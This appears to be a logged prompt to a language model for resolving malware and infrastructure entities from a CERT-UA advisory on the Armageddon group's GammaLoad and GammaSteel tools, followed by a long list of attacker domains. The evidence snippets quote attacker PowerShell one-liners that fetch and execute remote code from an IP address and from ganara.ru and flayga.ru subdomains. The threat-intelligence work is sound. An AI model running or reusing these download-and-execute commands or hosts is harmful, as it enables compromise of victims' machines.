=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ої пошти (зі скомпрометованих акаунтів і на приватні електронні адреси) HTM-дроперів (в тому числі, в UTF-16 кодуванні), що ініціюють ланцюг доставки GammaLoad.PS1 на комп'ютер жертви.</p><p>Метою зловмисників, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer."
Entities:
E1. PowerShell [aka powershell.exe]
E2. Browser.ps1
E3. GAMMASTEEL
E4. LOADSHORT
E5. SearchEmbdIndex.ps1
E6. init.ps1
E7. GAMEDAY
E8. PHP
E9. LOADNEST
E10. DROPCLUE
E11. LUMMASTEALER
E12. MSHTA [aka mshta.exe]
E13. STEELHOOK
E14. GHOSTPULSE
E15. SmartAssembly .NET [aka SmartAssembly]
E16. MARSSTEALER
E17. Windows
E18. LAKEFLASH
E19. dirbuster
E20. HVNC bot
E21. ATERA
E22. LOADERX3
E23. USB.dll [aka Usb]
E24. Browsers
E25. REDLINESTEALER
E26. MS Exchange [aka Microsoft Exchange Server]
E27. ArmyPlus.exe
E28. Log4Shell
E29. CCleaner.exe
E30. ProxyShell
E31. cscript.exe
E32. CodeMeter.exe
E33. P0wnyShell
E34. GammaSteel.PS1
E35. GammaSteel.NET
E36. HarvesterX
E37. PowerShell (powershell.exe)
E38. GammaLoad.PS1
E39. kissmafiabeforyoudied.ru
E40. supermarioprohozhdenie.ru
E41. iloveua.ir
E42. abracodabugalimpopo.ru
E43. grafix.ne.jp
E44. browser.events.data.certifiedauth.in
E45. s3-monitoring.cloud
E46. againandagaingmorder.ru
E47. redport80.ru
E48. monitor.personlog.in
E49. ardeas.ru
E50. humanitarydp.ru
E51. atl.ua
E52. hilr.ru
E53. s3-atlassian.cloud
E54. zallesman.ru
E55. talanti-ua.mom
E56. agentsuperpupervinil.ru
E57. rafraystore.ru
E58. balkimotion.ru
E59. maxteroper.ru
E60. vdsina.ru
E61. lolifans.ru
E62. mockbin.org
E63. coudzoom.ru
E64. ipodromlan.ru
E65. monopoliafromyou.ru
E66. groupdavinci.online
E67. unayt.ru
E68. sakentoshi.ru
E69. benokij.com
E70. 00-l.ru
E71. picwalldoor.ru
E72. calendar.stib.com.ua
E73. personlog.in
E74. shopersport.ru
E75. com.personlog.in
E76. shapurt.ru
E77. m.personlog.in
E78. comperssw.fun
E79. deti.eu
E80. deti-ua.eu
E81. rubidiumo.ru
E82. civh.ru
E83. vivianstyler.ru
E84. kjhgdj99fuller.ru
E85. farbi-ua.pics
E86. zaikadoctor.ru
E87. monitor.binance.com.exmo.day
E88. golosdruga.ru
E89. internetcygane.ru
E90. infomalilopera.ru
E91. kilomunara.com
E92. tvoyaradostetoya.ru
E93. reg.ru
E94. hardingtwominuterule.com
E95. superdadymster.ru
E96. agrikoz.com
E97. kismamabeforyougo.ru
E98. killredls.pw
E99. iqhost.ru
E100. gondurasonline.ru
E101. dis.gov.ua
E102. hopentools.ru
E103. ligaspace.ru
E104. jslopasitmon.com
E105. hsts.online [aka www.hsts.online]
E106. magicpic.eu
E107. zalamafiapopcultur.ru
E108. meta.ua
E109. metallergroup.ru
E110. tme-id.ru
E111. balletworld.co
E112. simplecloud.ru
E113. samoramertut.ru
E114. kew.1qw.us
E115. kew.8df.us
E116. rmssrv.ru
E117. golos2023q.ru
E118. rnbo.gov.ua
E119. rms-server.tektonit.ru
E120. bluepablo.fun
E121. telegram-click.ru
E122. getssl.click
E123. minef.eu
E124. zbignef.com
E125. check-active.site
E126. adobeprotectcheck.com
E127. dnspod.com
E128. derzhposluhy.com [aka uspp.derzhposluhy.com]
E129. check.sign-cert.com [aka sign-cert.com]
E130. documents-reader.com
E131. authcheck.in [aka www.authcheck.in]
E132. mirotrent.com [aka plntr.mirotrent.com]
E133. superboler.com
E134. outlook.com
E135. advanced-ip-scaner.com
E136. ipapi.co
E137. api.binance.com.exmo.day
E138. advanced-ip-scanners.com
E139. api.personlog.in
E140. api.binance.com.personlog.in
E141. advanced-ip-scanner.website
E142. advanced-ip-scanner.site
E143. in-touc.com
E144. iplogger.com
E145. internet.bs
E146. armpress.net
E147. dwservice.net [aka www.dwservice.net]
E148. aneria.net
E149. aleimportadora.net
E150. filebin.net
E151. numsecukr.net
